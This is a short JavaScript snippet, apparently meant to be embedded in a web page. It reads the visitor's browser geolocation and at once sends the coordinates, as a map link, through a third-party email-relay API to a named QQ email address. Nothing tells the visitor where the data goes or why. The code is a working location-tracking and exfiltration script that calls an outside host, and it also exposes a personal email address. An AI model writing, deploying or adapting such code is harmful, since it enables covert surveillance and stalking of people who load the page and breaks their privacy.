function getLocation() {
    return new Promise((resolve, reject) => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => resolve(position.coords),
          error => reject(error)
        );
      } else {
        reject(new Error('浏览器不支持地理位置获取.'));
      }
    });
  }

  function sendGetRequest(latitude, longitude) {
    const url = `https://v.api.aa1.cn/api/qqemail/new/?to=jun.csy@qq.com&subject=2003&message=https://uri.amap.com/marker?position=${latitude},${longitude}`;

    fetch(url)
      .then(response => {
        console.log('GET请求成功！');
        console.log(response);
        // 这里可以对返回的数据进行处理
      })
      .catch(error => {
        console.log('GET请求失败.');
        console.error(error);
      });
  }

  getLocation()
    .then(coords => {
      const { latitude, longitude } = coords;
      sendGetRequest(latitude, longitude);
    })
    .catch(error => {
      console.error(error);
    });
